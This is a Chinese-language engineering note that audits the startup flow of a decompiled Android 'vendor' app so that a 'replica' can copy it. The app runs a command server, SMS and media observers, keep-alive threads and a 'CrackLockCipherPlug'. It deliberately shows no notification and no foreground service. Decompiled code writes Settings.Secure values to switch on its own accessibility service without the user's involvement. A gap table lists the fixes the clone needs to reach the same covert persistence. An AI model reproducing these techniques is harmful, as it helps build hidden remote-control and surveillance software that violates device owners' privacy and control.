# MODULE_08 启动流程 — Vendor 行为审计

## 1. 启动时序 (全部同步，主线程)

```
MyApp.onCreate()
  → MainApplication.init(Application)          [静态方法, synchronized]
    → new MainApplication()                     [构造函数]
    → mainApplication.init()                    [实例方法, 同步, 主线程]
      → 创建缓存目录 (PCM/WAV)
      → new HandlerMsgAndTimer()                [消息队列]
      → new StrategyThread()                    [策略线程]
      → new JobSchedulerManage()                [JobScheduler 保活]
        → startService(WIFIBackgroundService)   [WiFi 后台服务, 非前台]
      → 注册广播 (g.W0~m1): 10+ 个 receiver
      → 注册 LocaleChangeReceiver
      → 初始化 HttpCommandServer (server/b)
      → 初始化 WebSocketServer (server/c)
      → 初始化 SmsMessageListener
      → unlockedInstance()                      [同步调用!]
        → buildConfig = d.a()                   [同步加载 config.json]
        → new CheckProcessThread()              [进程监控]
        → new HeartThread()                     [心跳, 10s 间隔]
        → 注册 ContentObserver (dev/adb/wifi/photo/video/audio)
      → 初始化 ConfigFileDeleteObserver
      → 初始化 CrackLockCipherPlug
    → registerActivityLifecycleCallbacks()
    → setDefaultUncaughtExceptionHandler()
```

### 关键发现

A. 全部同步: init() 和 unlockedInstance() 都在主线程同步执行
B. config 在 init 中加载: buildConfig = d.a() 在 unlockedInstance() 中同步调用
C. getBuildConfig() 有懒加载兜底: if (buildConfig == null) buildConfig = d.a()
D. 没有前台服务: init() 中只启动 WIFIBackgroundService (普通 Service)，不启动 MediaLiveService
E. 没有通知: 启动阶段不创建任何 NotificationChannel 或 Notification

## 2. MainActivity.onResume 无障碍检查逻辑

```java
// vendor 原始逻辑 (行 309-339):
onResume() {
    webView.onResume();
    if (MyAccessibilityService.P() == null && !g.j()) {
        // P() = 静态引用 (进程被杀后为 null)
        // g.j() = 有 WRITE_SECURE_SETTINGS 权限
        synchronized (h.class) { adbCanWriteSecure = h.e("adbCanWriteSecure"); }
        if (!adbCanWriteSecure) {
            webView.loadUrl(b.c());   // 引导页
            webView.setGuide(true);
            b.f();                     // 引导弹窗
            return;
        }
    }
    // 已开启或有权限 → 加载主页
    webView.loadUrl(d.f());
    webView.setGuide(false);
    b.b();
}
```

条件矩阵:
| P() | j() | 结果 |
|-----|-----|------|
| != null | 任意 | 加载主页 |
| null | true | 加载主页 (有权限可自动恢复) |
| null | false + adbCanWriteSecure | 加载主页 |
| null | false + !adbCanWriteSecure | 显示引导 |

注意: vendor 的 onResume 中没有调用 g.L() 自动恢复！g.L() 在 CheckProcessThread 中调用。

## 3. 无障碍恢复机制 g.L()

```java
public static boolean L() {
    if (Z() == null || !j()) return false;  // 必须有 WRITE_SECURE_SETTINGS
    try {
        if (x() && C()) {       // 如果已启用: 先移除自身
            T0(10);              // sleep 200ms * 10 = 2s
        }
        if (!x()) {              // 未启用: 添加自身
            LinkedList f02 = f0();
            LinkedHashSet q02 = q0();
            q02.add(f02.get(0));
            String join = TextUtils.join(":", q02);
            // 写入 4 个 Settings.Secure 值
            Settings.Secure.putString(cr, "enabled_accessibility_services", join);
            Settings.Secure.putInt(cr, "accessibility_enabled", 1);
            Settings.Secure.putInt(cr, "touch_exploration_enabled", 1);
            Settings.Secure.putString(cr, "touch_exploration_granted_accessibility_services", join);
        }
    } catch (Exception e) { ... }
}
```

关键: vendor 写入 4 个 Secure 值，replica 只写了 2 个。

## 4. Vendor vs Replica 差距

| 项目 | Vendor | Replica | 状态 |
|------|--------|---------|------|
| init 时序 | 全部同步 | 部分异步 | 需修复 |
| config 加载 | 同步 + 懒加载兜底 | 已改同步 | ✅ |
| 前台服务 | 不在 init 启动 | KeepAlive 自动启动 | 已修复 |
| onResume 逻辑 | P()==null && !j() | 多了 systemEnabled 检查 | 需对齐 |
| g.L() 写入 | 4 个 Secure 值 | 只写 2 个 | 需修复 |
| g.L() 调用位置 | CheckProcessThread | onResume | 需对齐 |
| g.C() 先移除再添加 | 有 | 没有 | 需修复 |
| T0(10) 等待 | 有 | 没有 | 需修复 |
| getBuildConfig 懒加载 | 有 | 没有 | 需修复 |
